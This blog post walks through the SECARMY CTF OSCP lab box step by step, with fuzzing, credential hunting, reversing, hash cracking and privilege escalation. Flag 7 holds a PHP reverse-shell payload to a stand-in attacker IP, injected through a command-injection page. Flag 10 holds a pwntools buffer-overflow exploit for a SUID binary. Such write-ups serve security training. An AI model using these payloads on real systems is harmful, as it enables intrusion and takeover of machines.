---
date: 2020-11-05 19:47:51
layout: post
title: "SECARMY CTF OSCP box"
description: "Writeup of the SECARMY CTF OSCP giveaway box"
image: /assets/img/secarmy-village-0.png
optimized_image: /assets/img/secarmy-village-0.png
category: blog
tags:
  - ctf
  - reversing
  - pwn
  - privilege_escalation

author: trollzorftw
---


### Flag 1
```bash
curl http://192.168.100.33
```
This gives us the following information: "You are required to find our hidden directory and make your way into the machine."

So naturally I throw a dirbust with common.txt wordlist at it:
```bash
ffuf -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.100.33/FUZZ

anon                    [Status: 301, Size: 315, Words: 20, Lines: 10]

curl http://192.168.100.33/anon/
```

Giving us the credentials for uno user:
```html
<font color="white">uno:luc10r4m0n</font>
```

### Flag 2
We read readme.txt and we get: 
"You surely can guess the username , the password will be: 4b3l4rd0fru705"
We try escalation to dos with password 4b3l4rd0fru705 and we get access


After reading readme.txt we run the following command:
```bash
cd ./files && grep -r a8211ac1853a1235d48829414626512a
```

Result: file4444.txt:a8211ac1853a1235d48829414626512a
Opening file4444.txt tells us to: Look inside file3131.txt
Getting a base64 encoded text which decoded gives us a zip file to get flag and the next todo instructions

```bash
echo "UEsDBBQDAAAAADOiO1EAAAAAAAAAAAAAAAALAAAAY2hhbGxlbmdlMi9QSwMEFAMAAAgAFZI2Udrg
tPY+AAAAQQAAABQAAABjaGFsbGVuZ2UyL2ZsYWcyLnR4dHPOz0svSiwpzUksyczPK1bk4vJILUpV
L1aozC8tUihOTc7PS1FIy0lMB7LTc1PzSqzAPKNqMyOTRCPDWi4AUEsDBBQDAAAIADOiO1Eoztrt
dAAAAIEAAAATAAAAY2hhbGxlbmdlMi90b2RvLnR4dA3KOQ7CMBQFwJ5T/I4u8hrbdCk4AUjUXp4x
IsLIS8HtSTPVbPsodT4LvUanUYff6bHd7lcKcyzLQgUN506/Ohv1+cUhYsM47hufC0WL1WdIG4WH
80xYiZiDAg8mcpZNciu0itLBCJMYtOY6eKG8SjzzcPoDUEsBAj8DFAMAAAAAM6I7UQAAAAAAAAAA
AAAAAAsAJAAAAAAAAAAQgO1BAAAAAGNoYWxsZW5nZTIvCgAgAAAAAAABABgAgMoyJN2U1gGA6WpN
3pDWAYDKMiTdlNYBUEsBAj8DFAMAAAgAFZI2UdrgtPY+AAAAQQAAABQAJAAAAAAAAAAggKSBKQAA
AGNoYWxsZW5nZTIvZmxhZzIudHh0CgAgAAAAAAABABgAAOXQa96Q1gEA5dBr3pDWAQDl0GvekNYB
UEsBAj8DFAMAAAgAM6I7USjO2u10AAAAgQAAABMAJAAAAAAAAAAggKSBmQAAAGNoYWxsZW5nZTIv
dG9kby50eHQKACAAAAAAAAEAGACAyjIk3ZTWAYDKMiTdlNYBgMoyJN2U1gFQSwUGAAAAAAMAAwAo
AQAAPgEAAAAA" | base64 -d > flag2.zip

unzip flag2.zip && cat ./challenge2/flag2.txt
```

### Flag 3
We obtain a super secret token from the previous archive and use it on 1337 port

```bash
echo "c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b" | nc 192.168.100.33 1337
```

Which gives us:
```
 Welcome to SVOS Password Recovery Facility!
 Enter the super secret token to proceed: 
 Here's your login credentials for the third user tres:r4f43l71n4j3r0
```

### Flag 4
We get a binary which we need to reverse.Using gdb-peda as our reverse tool, we run the binary and close it when it prompts us to enter the key. Because I was unable to breakpoint anywhere in the main function, I tried to find "keywords" that might be in the binary.The command "find 'credentials'" worked and I got:
```bash
mapped : 0x7ffff7ffb09b ("credentials for the fourth user cuatro:p3dr00l1v4r3z")
```

### Flag 5
The todo.txt tells us to go to /justanothergallery on the webserver
After analyzing a little bit we get a bunch of qr images in: http://192.168.100.33/justanothergallery/qr/
Downloading them all and decoding the qr codes with a simple python script gives us the next credentials and flag:
```python
from PIL import Image
from pyzbar.pyzbar import decode
import sys

imgs = []
for i in range(69):
	imgs.append('image-{}.png'.format(i))

decoded_text = ''

for img in imgs:
	data = str(decode(Image.open(img))[0]).split("data=b'")[1].split("',")[0]
	decoded_text += data + ' '

print(decoded_text)
```

Result:
```
Hello and congrats for solving this challenge, we hope that you enjoyed the challenges we presented so far. It is time for us to increase the difficulty level and make the upcoming challenges more challenging than previous ones. Before you move to the next challenge, here are the credentials for the 5th user: cinco:ruy70m35 head over to this user and get your 5th flag! goodluck for the upcoming challenges!
```

### Flag 6
Reading readme.txt points us to /cincos-secrets/ here we'll get a shadow.bak file but is not readable. Changing the permissions will give us a hash:
```bash
chmod 444 shadow.bak && cat shadow.bak | grep seis
```
Output: seis:$6$MCzqLn0Z2KB3X3TM$opQCwc/JkRGzfOg/WTve8X/zSQLwVf98I.RisZCFo0mTQzpvc5zqm/0OJ5k.PITcFJBnsn7Nu2qeFP8zkBwx7.:18532:0:99999:7:::

Cracking the hash gives us the password: Hogwarts , so creds: seis:Hogwarts


### Flag 7
The readme.txt file gives us the following path: "head over to /shellcmsdashboard webpage and find the credentials!"
After trying a bit with hydra, having no success because no message on fail. I decided to bruteforce login on burp sniper attack and obtained the password qwerty and getting message "head over to /aabbzzee.php" which will give us a easy command injection box where we will get a reverse shell from.

Adding "php -r '$sock=fsockopen("ATTACKER-IP",LISTEN-PORT);exec("/bin/sh -i <&3 >&3 2>&3");'" in the search bar
and setting up a netcat reverse shell on LISTEN-PORT on the attacker box we will get www-data shell where we get the seventh user password: 6u1l3rm0p3n473

### Flag 8
After playing around with the message, I discovered that xoring "x" with every number in message.txt will give us the password. I created a small python script to extract it:

```python
message = [11, 29, 27, 25, 10, 21, 1, 0, 23, 10, 17, 12, 13, 8]
extracted = ''
for key in message:
  extracted += chr(ord('x')^key)

print(extracted)
```
Output: secarmyxoritup and get the new password: m0d3570v1ll454n4


### Flag 9
We are presented with a pcapng file. Opening it up with wireshark we will get a tcp stream that has a LOT of text in which "QWERTY" is repeated a lot. Also, there were some dns queries to dcode.fr so there is a hint of that too.

We obtain a password from the long text: mjwfr?2b6j3a5fx/c .Using dcode.fr and use keyboard shift cipher with settings: 
	-QWERTY(US) 
	-Shift Right + Clockwise rotation

Getting result: 	nueve:355u4z4rc0


### Flag 10
We have a suid set binary, so we will need to exploit it to get root. Reversing it and creating a small python exploit script we get root:

```python
from pwn import *

io = process("./orangutan")
io.recvline("pwnme if u can ;)")
junk = b"A" * 24
payload = junk + p64(0xcafebabe)
io.sendline(payload)
io.interactive()
```